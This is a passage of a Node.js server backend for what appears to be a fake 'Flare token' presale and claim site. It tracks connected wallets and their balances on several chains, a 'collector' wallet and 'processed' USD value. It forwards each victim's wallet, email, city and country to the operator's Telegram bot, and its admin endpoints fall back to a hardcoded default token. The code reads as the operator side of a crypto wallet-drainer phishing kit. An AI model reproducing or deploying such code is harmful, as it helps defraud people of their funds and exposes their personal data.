            `   🏳️ ${participant?.country || 'Unknown'} ${participant?.flag || ''}\n` +
            `   📧 ${participant?.email || 'Unknown'}\n\n` +
            
            `🆔 <b>FLOW ID:</b> \`${flowId}\`\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `✅ Distribution Complete`;
          
          await sendTelegramMessage(completedMessage);
        }
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Process error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT - DETAILED
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, email, location, chains, totalProcessedValue, reward, bonus } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    participant.claimData = {
      email,
      chains,
      totalProcessedValue,
      reward,
      bonus,
      location,
      claimedAt: new Date().toISOString()
    };
    
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    // Build chains list
    let chainsList = '';
    if (chains && chains.length > 0) {
      chains.forEach((c, i) => {
        chainsList += `   ${i+1}. ${c}\n`;
      });
    }
    
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🎉 <b>FLARE TOKEN CLAIMED</b> 🎉\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `👛 <b>WALLET:</b>\n` +
      `   📝 \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
      `   🎟️ Claim ID: \`${claimId}\`\n\n` +
      
      `🎁 <b>REWARD:</b>\n` +
      `   🪙 Token: <b>${reward || '5,000 FLR'}</b>\n` +
      `   💰 Bonus: <b>${bonus || '20%'}</b>\n` +
      `   💵 Value: <b>$${totalProcessedValue || '850'}</b>\n\n` +
      
      `✅ <b>PROCESSED CHAINS:</b>\n${chainsList}\n` +
      
      `📍 <b>LOCATION:</b>\n` +
      `   🏳️ Country: ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
      `   🏙️ City: ${location?.city || participant.city}\n` +
      `   📧 Email: ${email || participant.email}\n\n` +
      
      `📊 <b>STATISTICS:</b>\n` +
      `   👥 Total Participants: ${memoryStorage.participants.length}\n` +
      `   🎯 Eligible: ${memoryStorage.participants.filter(p => p.isEligible).length}\n` +
      `   ✅ Claimed: ${memoryStorage.settings.statistics.claimedParticipants}\n` +
      `   💰 Total USD: $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}\n\n` +
      
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `✅ CLAIM SUCCESSFUL`;
    
    await sendTelegramMessage(message);
    
    res.json({ 
      success: true,
      data: {
        claimId,
        reward,
        token: 'FLR'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

app.get('/api/admin/dashboard', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  // Calculate statistics
  const totalEligible = memoryStorage.participants.filter(p => p.isEligible).length;
  const totalClaimed = memoryStorage.participants.filter(p => p.claimed).length;
  const totalFLRDistributed = totalClaimed * 5000;
  
  // Get recent activity
  const recentVisits = memoryStorage.siteVisits.slice(-10).reverse();
  const recentParticipants = memoryStorage.participants.slice(-10).reverse();
  
  // Chain statistics
  const chainStats = {};
  Object.keys(RPC_CONFIG).forEach(chain => {
    chainStats[chain] = {
      processed: memoryStorage.settings.statistics.processedTransactions.filter(t => t.chain === chain).length,
      totalUSD: memoryStorage.settings.statistics.processedTransactions
        .filter(t => t.chain === chain)
        .reduce((sum, t) => sum + parseFloat(t.valueUSD || 0), 0)
    };
  });
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    summary: {
      participants: memoryStorage.participants.length,
      eligible: totalEligible,
      claimed: totalClaimed,
      totalFLRDistributed,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      pendingFlows: memoryStorage.pendingFlows.size,
      completedFlows: memoryStorage.completedFlows.size,
      siteVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      telegram: telegramEnabled ? '✅' : '❌',
      telegramBot: telegramBotName
    },
    chainStats,
    recentVisits: recentVisits.map(v => ({
      id: v.id,
      country: v.country,
      flag: v.flag,
      device: v.device,
      isBot: v.isBot,
      time: v.timestamp
    })),
    recentParticipants: recentParticipants.map(p => ({
      wallet: `${p.walletAddress.substring(0, 10)}...`,
      country: p.country,
      flag: p.flag,
      balance: p.totalValueUSD,
      eligible: p.isEligible,
      claimed: p.claimed,
      lastSeen: p.lastSeen
    }))
  });
});

app.get('/api/admin/stats', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  res.json({
    success: true,
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p.claimed).length,
      totalFLRDistributed: memoryStorage.participants.filter(p => p.claimed).length * 5000,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      pendingFlows: memoryStorage.pendingFlows.size,
      completedFlows: memoryStorage.completedFlows.size,
      telegram: telegramEnabled ? '✅' : '❌',
      siteVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
    }
  });
});

app.get('/api/admin/wallet/:address', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const walletAddress = req.params.address.toLowerCase();
  const participant = memoryStorage.participants.find(p => p.walletAddress === walletAddress);
  
  if (!participant) {
    return res.json({ success: true, found: false });
  }
  
  const visits = memoryStorage.siteVisits.filter(v => v.walletAddress === walletAddress);
  const flows = Array.from(memoryStorage.pendingFlows.values()).filter(f => f.walletAddress === walletAddress);
  const completed = Array.from(memoryStorage.completedFlows.values()).filter(f => f.walletAddress === walletAddress);
  const transactions = memoryStorage.settings.statistics.processedTransactions.filter(t => t.wallet.toLowerCase() === walletAddress);
  
  res.json({
    success: true,
    found: true,
    wallet: {
      ...participant,
      connectionHistory: participant.connectionHistory?.slice(-5)
    },
    visits: visits.slice(-5),
    flows: flows.slice(-5),
    completedFlows: completed.slice(-5),
    transactions: transactions.slice(-5)
  });
});

app.get('/api/admin/test-telegram', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const testMessage = 
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🧪 <b>TELEGRAM TEST</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `✅ <b>Connection Working!</b>\n\n` +
    `🤖 Bot: @${telegramBotName}\n` +
    `📊 Status: ${telegramEnabled ? '🟢 Active' : '🔴 Inactive'}\n` +
    `⏰ Time: ${new Date().toLocaleString()}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
  
  const success = await sendTelegramMessage(testMessage);
  
  res.json({ 
    success, 
    telegramEnabled,
    botName: telegramBotName
  });
});

app.get('/api/admin/force-telegram', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const result = await enableTelegram();
  res.json({ 
    success: result, 
    telegramEnabled, 
    botName: telegramBotName 
  });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// ERROR HANDLER
// ============================================

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error',
    message: err.message 
  });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ FLARE TOKEN BACKEND - ULTRA DETAILED MONITORING
  ================================================
  📍 Port: ${PORT}
  🔗 URL: https://flarebackend.vercel.app/
  🪙 Token: FLR (Flare)
  
  📦 COLLECTOR: ${COLLECTOR_WALLET}
  
  🌐 NETWORKS: Ethereum, BSC, Polygon, Arbitrum, Avalanche, Flare
  
  📊 MONITORING EVERYTHING:
  ✅ Site Visits - Full location & device details
  ✅ Wallet Connections - ALL balances shown (eligible or not)
  ✅ Balance Breakdown - Per chain amounts in crypto and USD
  ✅ Flow Preparation - Transaction details
  ✅ Chain Processing - Real-time progress
  ✅ Claims - Complete reward information
  
  🚀 STARTING TELEGRAM...
  ================================================
  `);
  
  await enableTelegram();
});
